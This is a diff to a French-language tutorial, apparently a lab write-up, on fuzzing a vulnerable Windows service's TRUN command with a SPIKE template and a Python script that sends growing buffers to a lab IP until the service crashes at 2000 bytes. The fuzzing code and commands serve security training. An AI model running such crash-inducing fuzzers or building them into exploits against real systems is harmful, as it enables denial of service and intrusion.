@@ -43,4 +43,56 @@ generic_send_tcp ip_windows 9999 stats.spk 0 0
 
 [fuzzing avec STATS](assets/1.png)
 
-On voit que le programme ne crash pas, essayons de modifier le fichier.
+
+On voit que le programme ne crash pas, essayons de modifier la commande.
+
+```spk
+fichier stats.spk
+
+s_readline();
+s_string("TRUN ");
+s_string_variable("0");
+```
+
+```bash
+generic_send_tcp ip_windows 9999 stats.spk 0 0
+```
+
+Parfait ! On s'aperçoit que le programme crashe. On a donc trouvé la vulnérabilité.
+
+[Programme crash](assets/2.png)
+
+## 3. Fuzzing (créer un PoC) <a name="fuzzing"></a>
+
+On va donc exploiter la faille déterminée précédemment. On va commencer par créer un script qui nous permettra de déterminer à combien de bytes le fuzzing a crash.
+
+```py
+
+import sys, socket
+from time import sleep
+
+buffer = "A" * 100
+
+while True:
+	try:
+		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		s.connect(('10.0.2.15',9999))
+		
+		payload = "TRUN /.:/" + buffer
+
+		s.send((payload.encode()))
+		s.close()
+		sleep(1)
+		buffer = buffer + "A"*100
+
+	except:
+		print("Fuzzing crashed at %s bytes" % str(len(buffer)))
+		sys.exit()
+
+```
+
+On lance le script et on attend que le programme crash.  
+Ici, on voit que le programme crash à 2000 bytes.  
+
+[Programme crash à 2000 bytes](assets/3.png)
+
